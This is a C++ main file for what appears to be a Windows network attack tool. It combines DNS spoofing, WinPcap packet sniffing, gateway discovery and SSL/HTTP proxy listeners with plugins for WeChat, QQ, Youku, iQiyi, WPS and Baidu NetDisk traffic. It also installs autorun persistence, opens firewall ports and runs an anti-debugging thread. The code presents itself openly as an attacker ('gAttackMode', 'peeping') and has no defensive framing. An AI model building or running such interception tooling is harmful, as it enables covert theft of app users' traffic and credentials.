#include "PreparePacket.h"
#include <algorithm>
#include <windows.h>
#include <winsock2.H>
#include <Iptypes.h >
#include <iphlpapi.h>
#include <string>
#include <iostream>
#include <vector>
#include <conio.h>
#include <DbgHelp.h>
#include <stdlib.h>
#include <string.h>
#include "include\\pcap.h"
#include "include\\pcap\\pcap.h"

#include "attacker.h"
#include "Public.h"
#include "Packet.h"
#include "snifferpacket.h"
#include "NetCardInfo.h"
#include "Confiig.h"

#include "attack.h"
#include "ssl\\sslentry.h"
#include "winpcap.h"

#include "HttpUtils.h"
#include "cipher/CryptoUtils.h"
#include "ssl/WeixinAndroid.h"
#include "security.h"
#include "FileOper.h"
#include "informer.h"
#include "utils/Tools.h"
#include "cipher/RSA.h"
#include "dnsutils/DnsProxy.h"
#include "ssl/HttpProxyListener.h"
#include "ssl/SSLProxyListener.h"
#include "ssl/informerProc.h"
#include "ssl/baofeng.h"
#include "ssl/QQManager.h"
#include "ssl/QQAndroid.h"
#include "cipher/sha1.h"
#include "cipher/UrlCodec.h"
#include "cipher/Base64.h"

#include "support/aos_crc64.h"
#include "ssl/HuYaPlugin.h"
#include "ssl/YoukuPC.h"
#include "ssl/QQ.h"
#include "ssl/Plugin2345.h"
#include "ssl/aliProtect.h"
#include "ssl/qukan.h"
#include "gateWay/gateway.h"
#include "gateWay/gateway.h"
#include "DnsUtils/dnsUtils.h"
#include "Utils/basesocket.h"
#include "ssl/IqiyiPlugin.h"
#include "ssl/WpsPlugin.h"
#include "ssl/QQ.h"
#include "Utils/simpleJson.h"
#include "cipher/compression.h"
#include "ssl/baiduNetDisk.h"
#include "ssl/peanutShell.h"
#include <conio.h>

#pragma comment(lib,"ws2_32.lib")
#pragma comment(lib,"dbghelp.lib")
#pragma comment(lib,"Iphlpapi.lib")
#pragma comment(lib,"./lib\\wpcap.lib")
#pragma comment(lib,"./lib\\zlib.lib")
#pragma comment(lib,"Advapi32.lib")

#pragma comment(lib,"./lib\\libcrypto.lib")
#pragma comment(lib,"./lib\\libssl.lib")
#pragma comment(lib,"./lib\\openssl.lib")

using namespace std;

#define TERMINAL_ATTACK_MODE		1
#define TERMINAL_SERVER_MODE		2
#define LOOP_TEST_MODE				3


int gAttackMode = 0;

//mmgr.myapp.com/myapp/wesecure_apk/kingcardext/kcsdk_5.0.0.3818.jar


void test() {
	int ret = 0;
	return;

	//ret = Compress::gzfile("config.ini", "test.zip");

	FileOper::initKey();
	char data[0x8000];
	HTTPPROXYPARAM param = { 0 };
	lstrcpyA(param.username, "jy20200614");

	return;
}


int main(int argc, char** argv)
{
#ifdef _DEBUG
	test();
#endif

	int	nRetCode = 0;
	char szout[1024];

	string username = "";
	string password = "";
	int netcard_selected = -1;
	if (argc >= 4)
	{
		username = argv[1];
		password = argv[2];
		netcard_selected = atoi(argv[3]);
	}

	HANDLE hMutext = (HANDLE)Public::checkInstanceExist();
	if (hMutext == FALSE)
	{
		printf("program has already be running\n");
		_getch();
		exit(-1);
	}

	WSADATA	stWsa = { 0 };
	nRetCode = WSAStartup(WSASTARTUP_VERSION, &stWsa);
	if (nRetCode)
	{
		printf("WSAStartup error code:%d\n", GetLastError());
		_getch();
		exit(-1);
	}

	string path = Public::getpath();
	SetCurrentDirectoryA(path.c_str());

	int winpcapDelay = 1;
	int opensslctrl = 0;
	unsigned long serverIP = 0;
	char szgwmac[64] = { 0 };
	string servername = "";
	vector<string> gDnsAttackList = Config::parseAttackCfg(path + CONFIG_FILENAME, &serverIP, &winpcapDelay, &opensslctrl, &gAttackMode, szgwmac, servername);
	if (gDnsAttackList.size() == 0) {
		printf("parse config file:%s error\r\n", CONFIG_FILENAME);
		_getch();
		return -1;
	}


	int cnt = Config::parseDnsCfg(DNS_FILENAME, gDnsAttackList);
	printf("parse dns attack url total:%u\r\n", cnt);

#ifndef _DEBUG

	nRetCode = Security::loginCheck(gAttackMode, username, password);
	if (nRetCode <= 0)
	{
		printf("username or password error\r\n");
		_getch();
		exit(-1);
	}
#endif

	unsigned long localIP = 0;
	unsigned long netmask = 0;
	unsigned long netgateIP = 0;
	unsigned char localMac[MAC_ADDRESS_SIZE] = { 0 };

	string adaptername = NetCardInfo::selectNetcard(&localIP, &netmask, &netgateIP, localMac, netcard_selected);
	if (adaptername == "")
	{
		printf("selectNetcard error\r\n");
		_getch();
		return -1;
	}

	if (gAttackMode == LOOP_TEST_MODE)
	{
		serverIP = localIP;
	}
	else if (gAttackMode == TERMINAL_SERVER_MODE)
	{
		//make sure serverip is correct in this mode
	}
	else if (gAttackMode == TERMINAL_ATTACK_MODE)
	{
		//make sure serverip is correct in this mode
	}


#ifndef _DEBUG
	nRetCode = Tools::autorun(username, password, netcard_selected);
	DWORD debugTd = 0;
	CloseHandle(CreateThread(0, PROXY_THREAD_STACK_SIZE, (LPTHREAD_START_ROUTINE)Security::antiDebug, 0, STACK_SIZE_PARAM_IS_A_RESERVATION, &debugTd));
#endif

	string devname = string(WINPCAP_NETCARD_NAME_PREFIX) + adaptername;
	pcap_t* pcapt = Winpcap::init(devname, winpcapDelay, netmask);
	if (pcapt == 0)
	{
		printf("winpcap init error\r\n");
		_getch();
		return -1;
	}
	printf("device name:%s,netmask:%08x,winpcap delay:%d\r\n", devname.c_str(), netmask, winpcapDelay);

	//vector，set，map这些容器的end()取出来的值实际上并不是最后一个值，而end的前一个才是最后一个值,需要用prev(xxx.end())，才能取出容器中最后一个元素
	auto iter = unique(gDnsAttackList.begin(), gDnsAttackList.end());
	gDnsAttackList.erase(iter, gDnsAttackList.end());

	vector<string> gHostAttackList = gDnsAttackList;
	gHostAttackList.push_back(HttpUtils::getIPstr(serverIP));
	gHostAttackList.push_back(HttpUtils::getIPstr(localIP));
	gHostAttackList.push_back("127.0.0.1");

	nRetCode = Config::shiftDnsFormat(gDnsAttackList);

	DnsUitls* dnsutils = new DnsUitls(gDnsAttackList);

	DWORD cmode = 0;
	HANDLE hc = GetStdHandle(STD_INPUT_HANDLE);
	nRetCode = GetConsoleMode(hc, &cmode);
	nRetCode = SetConsoleMode(hc, ~ENABLE_QUICK_EDIT_MODE);


	printf("checking encryption files,please wait...\r\n");
	string pluginPath = Public::getPluginPath();
	nRetCode = FileOper::checkFileCryption(pluginPath);

	gLocalIPAddr = localIP;
	gServerIP = serverIP;
	gLocalPath = path;

	in_addr ia = { 0 };
	ia.S_un.S_addr = gLocalIPAddr;
	gstrLocalIP = inet_ntoa(ia);
	ia.S_un.S_addr = gServerIP;
	gstrServerIP = inet_ntoa(ia);
	HttpUtils::ipv4toipv6((unsigned char*)&gLocalIPAddr, gLocalIPAddrV6);

	if (gAttackMode == TERMINAL_SERVER_MODE || gAttackMode == LOOP_TEST_MODE) {

		nRetCode = Tools::addFirewallPort(HTTP_PORT, "HTTP", "TCP");
		nRetCode = Tools::addFirewallPort(SSL_PORT, "SSL", "TCP");
		nRetCode = Tools::addFirewallPort(INFORMER_PORT, "INFORMER", "TCP");

		nRetCode = SSLEntry::sslEntry(serverIP, localIP, path, opensslctrl, gDnsAttackList, gHostAttackList, gAttackMode);

		nRetCode = Tools::setNetworkParams();

		printf("server has been ready to work...\r\n");
	}

	if (gAttackMode == TERMINAL_SERVER_MODE)
	{
		//nRetCode = Tools::initException(hMutext, username, password, netcard_selected);
		Sleep(-1);
	}

	//printf("set server ip:%s,attack ip:%s,default user:%s\r\n", servername.c_str(), HttpUtils::getIPstr(localIP).c_str(),G_USERNAME);
	//inet_ntoa返回一个字符指针，指向一块存储着点分格式IP地址的静态缓冲区（同一线程内共享此内存）

	if (gAttackMode == TERMINAL_ATTACK_MODE || gAttackMode == LOOP_TEST_MODE)
	{
		string userpluginPath = Public::getDefaultUserPluginPath();
		nRetCode = access(userpluginPath.c_str(), 0);
		if (nRetCode)
		{
			wsprintfA(szout, "attack data store:%s not exist!\r\n", G_USERNAME);
			printf(szout);
			_getch();
			exit(-1);
		}

		printf("parsing gateway mac and ip,please wait...\r\n");
		Gateway* gateway = new Gateway(pcapt, serverIP, localIP, localMac);

		int totalpack = gateway->getGateWay();
		// 		if (totalpack)
		// 		{
		// 			GATEWAYPARAM p = gateway->getGatewayParam();
		// 			printf("get gate way mac:%s,packet count:%d,mac count:%d,source ip:%s\r\n",
		// 				HttpUtils::getmac(p.mac.DstMAC).c_str(), p.cnt, gateway->mCnt, HttpUtils::getIPstr(p.ip.SrcIP).c_str());
		// 		}

		printf("attacker has been ready to work...\r\n");

		nRetCode = SnifferPacket::peeping(pcapt, serverIP, localIP, userpluginPath, gAttackMode);

		pcap_close(pcapt);
	}

	return nRetCode;
}

/*
0000:0000:0000:0000:0000:0000:6a0e:90b3
6a0e 90b3
135.75.43.52 按十六进制算出即87.4B.2B.34，
而87.4B.2B.34串地址一组还是8位，所以需要两组v4地址合成v6地址，
再把前96位补零，它可以被转化为
0000:0000:0000:0000:0000:0000:874B:2B34或者::874B:2B34
*/

//cmd执行程序时容易卡住 取消快速编辑模式
//全局变量空间一般比较大，因此大小超过1M的变量尽量声明为全局变量或者静态变量。
//统计代码行数 ^b*[^:b#/]+.*$